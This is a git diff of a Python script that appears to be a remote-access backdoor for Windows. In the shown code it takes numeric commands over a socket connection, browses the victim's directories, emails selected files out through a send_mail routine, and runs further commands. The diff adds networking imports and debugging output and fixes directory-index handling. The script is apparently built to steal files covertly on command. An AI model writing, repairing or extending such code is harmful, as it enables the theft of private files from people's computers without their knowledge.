@@ -3,7 +3,11 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+
 import zipfile
+import requests
+import smtplib
+import socket
 
 data_base=""
 comand={}
@@ -112,10 +116,11 @@ def iteration():
     data_base=""
     num_dir = float(conn.recv(1024).decode())
     #num_dir = float(input('\n:'))
-    if num_dir == int(''.join(str(num_dir).split(".")[0])) and num_dir >= 0:
+    if num_dir == float(''.join(str(num_dir).split(".")[0])) and num_dir >= 0:
         os.system('cls')
         data_base=""
-        path += dir[num_dir] + "\\"
+        path += dir[int(''.join(str(num_dir).split(".")[0]))] + "\\"
+        print(1)
     try:
         if num_dir == int(''.join(str(num_dir).split(".")[0]))+0.001:
             send_mail(path+dir[int(''.join(str(num_dir).split(".")[0]))])
@@ -128,8 +133,8 @@ def iteration():
             temp_2=False
         elif num_dir < 0:
             run_comand(num_dir)
-    except:
-        pass
+    except Exception as e:
+        print(e)
     return temp_2
 
 def start():
@@ -161,5 +166,5 @@ while 1:
         update_comand()
         path = ""
         start()
-    except:
-        pass
+    except Exception as e:
+        print(e)
